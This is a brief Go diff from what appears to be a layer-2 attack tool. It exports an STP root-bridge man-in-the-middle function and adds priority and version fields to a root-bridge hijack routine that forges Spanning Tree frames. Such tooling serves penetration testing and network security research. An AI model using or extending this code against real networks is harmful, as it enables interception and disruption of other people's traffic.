@@ -10,7 +10,7 @@ import (
 	"strings"
 )
 
-func stpRootBridgeMitM(iface1 string) {
+func StpRootBridgeMitM(iface1 string) {
 
 	ss, err := supersocket.NewSuperSocket(iface1, "")
 	if err != nil {
@@ -77,6 +77,9 @@ func stpRootBridgeHijack(iface string, params map[string]interface{}) {
 	stpLayer.Layer().PortID = 0x8002
 	stpLayer.SetRootBridgeMacStr(rootMAC)
 	stpLayer.SetRootBridgeID(rootID)
+	stpLayer.SetBridgePriority(32768)
+	stpLayer.SetRootBridgePriority(32768)
+	stpLayer.Layer().Version = 2
 	stpLayer.SetBridgeMacStr(bridgeMAC)
 	stpLayer.SetBridgeID(bridgeID)
 
